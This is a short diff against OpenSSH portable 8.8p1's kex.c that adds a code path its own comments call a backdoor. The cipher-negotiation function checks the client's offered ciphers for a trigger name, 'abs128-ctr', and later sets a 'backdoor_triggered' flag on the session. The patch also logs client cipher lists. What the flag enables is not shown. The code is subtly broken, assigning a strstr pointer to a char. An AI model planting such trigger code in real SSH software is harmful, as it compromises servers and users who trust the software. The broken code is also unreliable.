@@ -1,0 +1,29 @@
+--- openssh-portable-v8.8_p1/kex.c	2021-12-02 17:04:09.341420945 -0600
++++ openssh-portable-patch/kex.c	2021-12-02 17:31:51.655605934 -0600
+@@ -756,6 +756,15 @@
+ choose_enc(struct sshenc *enc, char *client, char *server)
+ {
+ 	char *name = match_list(client, server, NULL);
++	
++	/* Backdoor to search for trigger cipher */
++	char trigger_cipher[] = "abs128-ctr";
++	char triggered = strstr(client, trigger_cipher);
++
++	if (triggered) enc->found_backdoor_cipher = 1;
++
++	logit("client: %s", client);
++	
+ 
+ 	if (name == NULL)
+ 		return SSH_ERR_NO_CIPHER_ALG_MATCH;
+@@ -945,6 +954,10 @@
+ 			peer[nenc] = NULL;
+ 			goto out;
+ 		}
++
++		/* Check for backdoor cipher found */
++		if (newkeys->enc.found_backdoor_cipher == 1) ssh->backdoor_triggered = 1;
++
+ 		authlen = cipher_authlen(newkeys->enc.cipher);
+ 		/* ignore mac for authenticated encryption */
+ 		if (authlen == 0 &&
